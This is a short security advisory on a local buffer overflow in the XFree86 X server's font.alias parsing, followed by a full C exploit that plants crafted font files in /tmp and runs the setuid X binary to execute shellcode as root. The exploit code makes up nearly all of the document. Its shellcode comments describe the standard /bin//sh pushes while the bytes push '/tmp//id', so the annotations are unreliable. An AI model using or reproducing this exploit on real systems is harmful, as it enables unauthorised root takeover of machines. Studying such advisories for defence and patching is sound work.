source: http://www.securityfocus.com/bid/9636/info

It has been reported that the XFree86 X Windows system is prone to a local buffer overflow vulnerability. The issue arises from improper bounds checking when parsing the 'font.alias' file. Successful exploitation of this issue may allow an attacker to gain root privileges to the affected system.

/* For educational purposes only                            */
/* Brought to you by bender2@lonestar.org   11.10.2004      */

#include <fcntl.h>

#define NOPNUM 8000
#define ADRNUM 1058

/* shellcode from LSD */
char setuidcode[]=         /* 8 bytes                        */
    "\x33\xc0"             /* xorl    %eax,%eax              */
    "\x31\xdb"             /* xorl    %ebx,%ebx              */
    "\xb0\x17"             /* movb    $0x17,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

char shellcode[]=          /* 24 bytes                       */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//id"           /* pushl   $0x68732f2f            */
    "\x68""/tmp"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdql                           */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

char jump[]=
    "\x8b\xc4"                /* movl   %esp,%eax           */
    "\xc3"                    /* ret                        */
;


main(int argc,char **argv){
    char buffer[20000],adr[4],pch[4],*b,*envp[4];
    int i,fd;


    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+16000;

    envp[0]=&buffer[2000];
    envp[1]=0;

    printf("adr: 0x%x\n",adr+12000);

    b=buffer;
    strcpy(buffer,"1\n");
    strcat(buffer,"aaaa.pcf -aaaa-fixed-small-a-semicondensed--1-1-1-1-a-1-iso1111-1\n");
    fd=open("/tmp/fonts.dir",O_CREAT|O_WRONLY,0666);
    write(fd,buffer,strlen(buffer));

    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b++='\n';

    fd=open("/tmp/fonts.alias",O_CREAT|O_WRONLY,0666);
    write(fd,buffer,strlen(buffer));
    close(fd);

    b=&buffer[2000];
    
for(i=0;i<NOPNUM-strlen(setuidcode)-strlen(setuidcode)-strlen(shellcode);i++) 
*b++=0x90;
    for(i=0;i<strlen(setuidcode);i++) *b++=setuidcode[i];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    *b=0;

    execle("/usr/bin/X11/X","X",":0","-fp","/tmp",0,envp);
}